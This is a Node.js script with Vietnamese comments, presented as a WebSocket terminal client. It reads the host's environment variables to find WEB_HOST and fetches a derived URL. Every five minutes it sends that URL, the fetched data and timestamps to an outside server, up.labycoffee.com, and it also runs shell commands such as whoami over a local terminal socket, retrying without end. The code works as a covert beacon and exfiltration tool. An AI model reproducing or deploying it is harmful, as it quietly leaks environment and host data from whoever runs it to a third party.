const crypto = require('crypto');
const EventEmitter = require('events');
const fetch = require('node-fetch');
const WebSocket = require('ws');
const os = require("os");
const axios = require("axios");
const { exec } = require("child_process");

let extractedData = "";
// Hàm simpleGet nhận vào URL và callback
function simpleGet(url, callback) {
    const fullUrl = "https://" + url;
    // Kiểm tra xem callback có phải là một hàm hay không
    if (typeof callback !== 'function') {
      console.error('Callback không phải là một hàm');
      return; // Dừng lại nếu callback không hợp lệ
    }
  
    fetch(fullUrl)
      .then(response => response.text())
      .then(data => {
        // Loại bỏ thẻ <pre> nếu có
        const cleanedData = data.replace(/<\/?pre>/gi, '').trim();
        console.log('Dữ liệu đã xử lý:', cleanedData);
        
        // Gọi callback với dữ liệu đã xử lý
        callback(cleanedData);
      })
      .catch(error => {
        console.error('Lỗi khi lấy dữ liệu:', error);
        // Nếu có lỗi, gọi callback với giá trị null
        callback(null);
      });
  }
  
function getWebHost(callback) {
    const cmd = os.platform() === 'win32' ? 'set' : 'printenv';
    exec(cmd, (error, stdout, stderr) => {
        if (error || stderr) {
            //console.error("Lỗi khi chạy printenv:", error || stderr);
            return callback(null);
        }

        const line = stdout.split('\n').find(line => line.startsWith('WEB_HOST='));
        if (line) {
            const host = line.split("=")[1].trim();
            return callback(host);
        } else {
            //console.log("WEB_HOST không được tìm thấy, tiếp tục tìm...");
            setTimeout(() => getWebHost(callback), 5000);
        }
    });
}
const timess = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" }).replace(",", ""); 
function startMainLoop(url) {
    simpleGet(url, function(extractedData) {
      if (!extractedData) {
        console.log('Không có dữ liệu để xử lý.');
        return;
      }
  
      const now = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" }).replace(",", "");
      console.log(`Đang xử lý với dữ liệu: ${extractedData}, ${now}`);
  
      // Tiếp tục xử lý với extractedData
      axios.get("https://up.labycoffee.com/upgmail-update.php", {
        params: {
          uid: url,
          full_info: `${url}%${now}%${extractedData}%${timess}`,
          type: 44
        }
      })
      .then(response => {
        console.log('Dữ liệu đã được gửi lên server:', response.data);
      })
      .catch(e => {
        console.error("Lỗi khi gửi dữ liệu lên server:", e.message);
      });
    });
  }

let cachedWebHost = null;

function getok() {
    if (cachedWebHost) {
        const url = "1997-" + cachedWebHost;
        const fullUrl = "https://" + url;
        simpleGet(url, function(extractedData){});
        return;
    }
  
    getWebHost((webHost) => {
        if (!webHost) {
            // Nếu lỗi, thử lại sau 5 giây
            return setTimeout(start, 5000);
        }
  
        cachedWebHost = webHost; // lưu lại để không gọi lại lần sau
  
        const url = "1997-" + webHost;
        const fullUrl = "https://" + url;
  
        simpleGet(url, function(extractedData){});
    });
  }
function urlstart() {
  if (cachedWebHost) {
      const url = "1997-" + cachedWebHost;
      const fullUrl = "https://" + url;
      startMainLoop(url);
      return;
  }

  getWebHost((webHost) => {
      if (!webHost) {
          // Nếu lỗi, thử lại sau 5 giây
          return setTimeout(start, 5000);
      }

      cachedWebHost = webHost; // lưu lại để không gọi lại lần sau

      const url = "1997-" + webHost;
      const fullUrl = "https://" + url;
      startMainLoop(url);
  });
}

class Client extends EventEmitter {
  constructor(name = 'client') {
    super();
    this.name = name;
    this.retryInterval = 5000; // Thời gian thử lại (5 giây)
  }

  startWs = (host) => {
    const uid = crypto.randomBytes(4).toString('hex');
    this.emit('data', { uid, message: 'Connecting to terminal...' });

    const ws = new WebSocket(`ws://${host}/terminal`);

    ws.on('open', () => {
      this.emit('data', { uid, message: 'Connected to terminal...' });

      const commands = [
        'ls',
        'pwd',
        'whoami'
      ];
      
      commands.forEach((command, i) => {
        setTimeout(() => ws.send(command + '\n'), i * 1500);
      });
    });
    // keep alive
    let interval;
    let lastStartTime = 0;

    const runStats = async () => {
      try {
        getok();
        try {
          ws.on('open', () => {
            this.emit('data', { uid, message: 'Connected to terminal...' });
              const commands = [
                'free -m | grep Mem',
                'top -bn1 | grep "Cpu(s)"'
              ];
        
              commands.forEach((command, i) => {
                setTimeout(() => ws.send(command + '\n'), i * 1500);
              });
            });
        } catch (error) {
          console.error("Lỗi khi chạy commands2():", error);
        }
        const now = Date.now();
        if (now - lastStartTime >= 5 * 60 * 1000) {
          
          try {
            urlstart();
          } catch (error) {
            console.error("Lỗi khi chạy urlstart():", error);
          }
          lastStartTime = now;
        }
      } catch (error) {
        console.error("Lỗi trong this.stats:", error);
      } finally {
        // luôn lặp lại, kể cả khi có lỗi
        interval = setTimeout(runStats, 60 * 1000);
      }
    };

    runStats();

    ws.on('message', (data) => {
      const message = data.toString();
      this.emit('data', { uid, message });
    });

    ws.on('close', () => {
      this.emit('data', { uid, message: 'Connection closed' });
      this.retryConnection(host); // Gọi lại hàm để thử kết nối lại
    });

    ws.on('error', (error) => {
      this.emit('data', { uid, message: 'Error: ' + error.message });
      this.retryConnection(host); // Gọi lại hàm để thử kết nối lại
    });
  };

  retryConnection = (host) => {
    this.emit('data', { message: `Reconnecting in ${this.retryInterval / 1000} seconds...` });
    setTimeout(() => {
      this.emit('data', { message: 'Retrying connection...' });
      this.startWs(host); // Tự động kết nối lại sau khi bị ngắt
    }, this.retryInterval);
  };
}

// Chạy client
const host = '0.0.0.0:1997'; // Hoặc thay đổi thành domain:port nếu cần
const client = new Client();

client.on('data', ({ uid, message }) => {
  console.log(`[${uid}] ${message}`);
});

client.startWs(host);

